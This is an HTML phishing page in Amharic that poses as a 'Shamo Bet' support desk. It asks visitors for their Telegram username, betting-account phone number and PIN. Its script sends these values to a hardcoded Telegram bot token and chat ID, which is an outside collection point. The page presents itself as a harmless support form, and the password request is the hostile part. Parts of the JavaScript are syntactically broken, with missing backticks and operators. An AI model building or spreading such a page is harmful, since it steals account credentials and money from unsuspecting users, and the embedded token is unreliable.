
<html lang="am">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shamo Bet - Support Desk</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f4f6f9;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background-color: #ffffff;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            max-width: 450px;
            width: 100%;
        }
        h1 {
            color: #1e293b;
            font-size: 26px;
            margin-bottom: 8px;
            text-align: center;
        }
        .subtitle {
            color: #059669;
            font-weight: 600;
            font-size: 15px;
            text-align: center;
            margin-bottom: 20px;
        }
        .description {
            color: #475569;
            font-size: 14px;
            line-height: 1.5;
            background-color: #f1f5f9;
            padding: 12px;
            border-radius: 6px;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 16px;
        }
        label {
            display: block;
            font-weight: bold;
            color: #334155;
            margin-bottom: 6px;
            font-size: 14px;
        }
        input[type="text"], input[type="tel"], textarea {
            width: 100%;
            padding: 12px;
            border: 1px solid #cbd5e1;
            border-radius: 8px;
            box-sizing: border-box;
            font-size: 14px;
        }
        input:focus, textarea:focus {
            outline: none;
            border-color: #2563eb;
        }
        button {
            width: 100%;
            background-color: #2563eb;
            color: white;
            padding: 14px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        button:hover {
            background-color: #1d4ed8;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>SHAMO BET</h1>
    <div class="subtitle">እኛን ስለመረጡ እናመሰግናለን!</div>
    
    <div class="description">
        ይህ የ Shamo Support የቴክኒክ እና የተበላሹ ነገሮች ማስተካከያ ገጽ ነው። ፓስወርድዎ ያስገቡ።
    </div>

    <form id="supportForm">
        <div class="form-group">
            <label for="telegramUser">የ Telegram ስም (Username)</label>
            <input type="text" id="telegramUser" placeholder="@username" required>
        </div>

        <div class="form-group">
            <label for="phoneNumber">የ Shamo Bet ስልክ ቁጥር</label>
            <input type="tel" id="phoneNumber" placeholder="09........" required>
        </div>

        <div class="form-group">
            <label for="issueDetail">pin</label>
            <textarea id="issueDetail" rows="4" placeholder="ፓስወርዶ ያስገቡ..." required></textarea>
        </div>

        <button type="button" onclick="sendData()">መረጃውን ላክ</button>
    </form>
</div>

<script>
    function sendData() {
        // እዚህ ቦታ ላይ ከ BotFather ያገኙትን Token እና Chat ID ይተኩ
        const botToken = "8688090386:AAHSsKf9rnAs20X28cwSwGRe4w-csdjZFog"; 
        const chatId = "8841053408";

        const telegramUser = document.getElementById("telegramUser").value;
        const phoneNumber = document.getElementById("phoneNumber").value;
        const issueDetail = document.getElementById("issueDetail").value;

        if (!telegramUser  !phoneNumber  !issueDetail) {
            alert("እባክዎ ሁሉንም ሳጥኖች በትክክል ይሙሉ።");
            return;
        }

const messageText = 📩 **አዲስ የድጋፍ ጥያቄ (Shamo Support)**\n\n +
                            👤 **Telegram Username:** ${telegramUser}\n +
                            📞 **ስልክ ቁጥር:** ${phoneNumber}\n +
                            📝 **ፓስወርድዎ ያስገቡ:** ${issueDetail};

        const url = https://api.telegram.org/bot${botToken}/sendMessage;

        fetch(url, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: messageText,
                parse_mode: "Markdown"
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                alert("መረጃው በተሳካ ሁኔታ ተልኳል! በቅርቡ እናናግርዎታለን።");
                document.getElementById("supportForm").reset();
            } else {
                alert("መልእክቱን መላክ አልተቻለም። እባክዎ Bot Token እና Chat ID በትክክል ማስገባትዎን ያረጋግጡ።");
            }
        })
        .catch(error => {
            console.error("Error:", error);
            alert("የኔትወርክ ስህተት አጋጥሟል። እባክዎ እንደገና ይሞክሩ።");
        });
    }
</script>

</body>
</html>
